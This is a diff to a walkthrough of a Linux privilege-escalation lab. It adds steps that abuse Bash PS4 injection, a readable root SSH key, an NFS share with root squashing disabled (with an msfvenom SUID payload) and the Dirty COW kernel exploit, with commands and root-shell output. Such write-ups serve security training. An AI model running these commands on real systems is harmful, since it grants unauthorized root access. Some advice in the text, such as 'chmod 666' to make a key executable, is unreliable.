@@ -476,7 +476,10 @@ t$(L
 The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
 
 
-In Bash versions **<4.2-048** it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path. Verify the version of Bash: ```/bin/bash --version```
+In Bash versions **<4.2-048** it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path. Verify the version of Bash: 
+
+```/bin/bash --version```
+
 
 
 Create a Bash function with the name "**/usr/sbin/service**" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
@@ -495,7 +498,10 @@ root@debian:~#
 # [Task 15] SUID / SGID Executables - Abusing Shell Features (#2)
 **Note: This will not work on Bash versions 4.4 and above.**
 
-When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements. Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the **PS4** variable set to an embedded command which creates an SUID version of */bin/bash*: ```env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2```
+When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements. Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the **PS4** variable set to an embedded command which creates an SUID version of */bin/bash*: 
+
+
+```env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2```
 
 
 Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
@@ -543,3 +549,91 @@ root
 password123
 ``` 
 Switch to the root user, using the credentials:``` su root```
+
+# [Task 18] Passwords & Keys - SSH Keys 
+Sometimes users make backups of important files but fail to secure them with the correct permissions. at the root directory ```/``` you will find a hidden file call ```.ssh```. View the contents of the directory
+```console
+user@debian:~$ ls -la /.ssh/
+total 12
+drwxr-xr-x  2 root root 4096 Aug 25  2019 .
+drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
+-rw-r--r--  1 root root 1679 Aug 25  2019 root_key
+```
+As you can see we have a premission to read+write to ```root_key``` let copy the content of the file and to our machine and ssh to the target again using root cerdential. Dont for get to make the copied root_key executable by using ```chmod 666```. now run:
+```console
+kali@kali:~/LinuxPrivEsc$ ls
+cracked.txt  root_key  root.txt  shell.elf
+kali@kali:~/LinuxPrivEsc$ ssh -i root_key root@<target ip>
+Last login: Sun Aug 25 XXXXXXXXX from xxxxxxxx
+root@debian:~# 
+```
+#  [Task 19] NFS
+Before start doing this room, I would recommended to read this two links. [link1](https://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html), [link2](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot)
+
+
+Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user. to check the NFS share configuration , run ```cat /etc/exports``` Note that the /tmp share has root squashing disabled.
+
+Now let mount the NFS to our kali
+```console
+$ mkdir /tmp/nfs # create directory
+$ mount -o rw,vers=2 <target IP>:/tmp /tmp/nfs # mount NFS
+$ sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf # generate payload and save it at the mounted share      
+$ sudo chmod +xs /tmp/nfs/shell.elf # make the payload executable and set the SUID permission.
+```
+The owner of the payload now is root user which is why we set the SUID permission. so the we PrivEsc using user cerdential to execute the payload.
+```console
+user@debian:~$ ls -la /tmp/
+total 116                                                     
+drwxrwxrwt  2 root root  4096 May 25 20:14 .                  
+drwxr-xr-x 22 root root  4096 Aug 25  2019 ..                 
+-rw-r--r--  1 root root 94636 May 25 20:14 backup.tar.gz      
+-rwsr-sr-x  1 root root   132 May 25 20:13 shell.elf          
+-rw-r--r--  1 root root    29 May 25 20:14 useless
+user@debian:~$ /tmp/shell.elf                                 
+bash-4.1# whoami                                              
+root 
+```
+
+#  [Task 20] Kernel Exploits
+Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort. Run the ```Linux Exploit Suggester 2``` tool to identify potential kernel exploits on the current system. github links for ```Linux Exploit Suggester 2``` [here](https://github.com/jondonas/linux-exploit-suggester-2)
+
+
+note that the target machine is vulnerable to **Dirty Cow**. watch [this](https://youtu.be/kEsshExn7aE), It might help to understand how dity cow works. Exploit code for Dirty COW can be found at ```/home/user/tools/kernel-exploits/dirtycow/c0w.c``` or download from exploit-db. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).Compile the code and run it (note that it may take several minutes to complete):
+
+```console
+user@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+
+user@debian:~$ ./c0w
+                                
+   (___)                                   
+   (o o)_____/                             
+    @@ `     \                            
+     \ ____, //usr/bin/passwd                          
+     //    //                              
+    ^^    ^^                               
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd to /tmp/bak
+mmap efe25000
+
+madvise 0
+
+ptrace 0
+
+user@debian:~$ /usr/bin/passwd
+root@debian:/home/user#  
+```
+now to remove the expoit and return the machine back to normalt stage
+```console
+$ mv /tmp/bak /usr/bin/passwd
+$ exit
+```
+# [Task 21] Privilege Escalation Scripts
+
+Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: /home/user/tools/privesc-scripts
+
+
+
+DAAAAAMN! what a script man. it is a Linux Enumeration & Privilege Escalation Scripts. It give you everything about the local Linux machine. here is the github link [LinEnum](https://github.com/rebootuser/LinEnum), [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), and [lse](https://github.com/diego-treitos/linux-smart-enumeration)
+
+
+To learn more about tools' options you can run ```-h``` or vistie the tools website.
